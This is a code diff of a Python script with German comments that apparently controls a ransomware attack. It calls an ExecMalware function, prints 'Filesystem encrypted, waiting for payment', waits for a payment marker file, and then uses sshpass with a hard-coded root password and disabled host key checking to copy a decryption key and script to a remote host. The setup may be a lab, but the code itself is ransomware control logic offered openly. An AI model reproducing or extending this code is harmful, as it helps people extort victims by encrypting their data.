@@ -5,6 +5,7 @@ from cryptography.hazmat.backends import default_backend
 import os
 import time
 import paramiko
+import subprocess
 
 def ExecMalware():
 
@@ -22,8 +23,26 @@ def ExecMalware():
     client.close()
 
 
+def wait_for_payment(file_path, timeout=60):
+    start_time = time.time()
+    while not os.path.exists(file_path):
+        if time.time() - start_time >= timeout:
+            print("Timeout: Datei wurde nicht gefunden.")
+            return False
+        time.sleep(1)  # Warten Sie 1 Sekunde, bevor Sie erneut überprüfen
 
-
+    print("Datei gefunden:", file_path)
+    # Führen Sie hier Ihre gewünschte Aktion aus
+    print("Bezahlt")
+    time.sleep(3)
+    print("---------")
+    print("Schicke Decryption + key")
+    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no chkey.txt "+ "root"+"@172.17.0.3:/root/../"
+    os.system(ostring)
+    print("key verschickt")
+    ostring = "sshpass -p " + "root"  +  " scp -o StrictHostKeyChecking=no decrypt.py "+ "root"+"@172.17.0.3:/root/../"
+    os.system(ostring)
+    print("Decryption verschickt")
 
 
 def wait_for_file(file_path, timeout=60):
@@ -56,12 +75,13 @@ def wait_for_file(file_path, timeout=60):
     time.sleep(5)
     print("Führe verschlüsselung durch")
     ExecMalware()
+    print("Filesystem encrypted, waiting for payment")
 
 
 # Beispielaufruf
 file_path = "/kenndaten.txt"
 wait_for_file(file_path, timeout=120)
-
+wait_for_payment("/payment", timeout=120)
 
 
 
